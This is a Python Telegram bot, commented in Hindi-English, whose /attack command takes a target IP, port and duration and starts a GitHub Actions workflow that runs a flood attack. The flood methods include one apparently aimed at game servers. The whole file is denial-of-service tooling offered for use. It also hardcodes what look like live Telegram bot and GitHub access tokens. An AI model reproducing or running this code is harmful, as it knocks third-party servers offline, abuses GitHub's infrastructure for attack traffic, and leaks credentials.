import os
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from github import Github

# --- SETUP ---
BOT_TOKEN = "8245251931:AAHRTmcXs90zC_3kd2_yIIjnA1ilUAtif5U"  # BotFather se lein
ADMIN_IDS = [6293907676]           # Apni ID dalein
GITHUB_TOKENS = ["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"] # GitHub Settings > Developer Settings se lein

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✨ **PRIMEXARMY SYSTEM ONLINE**\nCommands: /attack <ip> <port> <time>")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id not in ADMIN_IDS:
        return

    if len(context.args) < 3:
        await update.message.reply_text("Format: /attack 1.1.1.1 8080 60")
        return

    ip, port, duration = context.args
    method = "VC_FLOOD" if ip.startswith("91") else "BGMI_FLOOD"

    await update.message.reply_text(f"🚀 **Attack Sent!**\nTarget: {ip}:{port}\nMethod: {method}")

    # GitHub Action Trigger
    for token in GITHUB_TOKENS:
        try:
            g = Github(token)
            repo = g.get_repo("APNA_USER_NAME/REPO_NAME") # Apni repo path dalein
            workflow = repo.get_workflow("main.yml")
            workflow.create_dispatch("main", {"ip": ip, "port": port, "time": duration, "method": method})
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.run_polling()